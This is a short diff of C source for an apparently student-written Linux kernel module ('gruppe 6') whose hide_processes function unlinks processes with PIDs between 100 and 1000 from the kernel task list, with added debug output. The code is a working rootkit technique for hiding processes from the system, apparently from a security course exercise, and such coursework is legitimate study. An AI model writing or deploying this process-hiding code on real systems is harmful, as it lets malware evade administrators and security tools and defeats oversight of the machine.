@@ -210,10 +210,13 @@ void hide_processes(void){
         next = next_task(task);
         if ((task->pid > 100) && (task->pid < 1000)){
             OUR_DEBUG("1 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
-            OUR_DEBUG("1 task %p, tc->next %p, tc->prev %p\n", &task->sibling, task->children.next, task->children.prev);
-            prev->sibling.next = task->sibling.next;
-            next->sibling.prev = task->sibling.prev;
+            OUR_DEBUG("1 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
+            OUR_DEBUG("task %p, prev %p\n", task, prev);
+            OUR_DEBUG("task->next %p, prev->next %p\n", task->tasks.next, prev->tasks.next);
+            prev->tasks.next = task->tasks.next;
+            next->tasks.prev = task->tasks.prev;
             OUR_DEBUG("2 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
+            OUR_DEBUG("2 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
         }
     } while ((task = next) != &init_task);
 }
@@ -222,7 +225,6 @@ void hide_processes(void){
 static int __init _init_module(void)
 {
     int i;
-    struct task_struct *task;
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
     for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
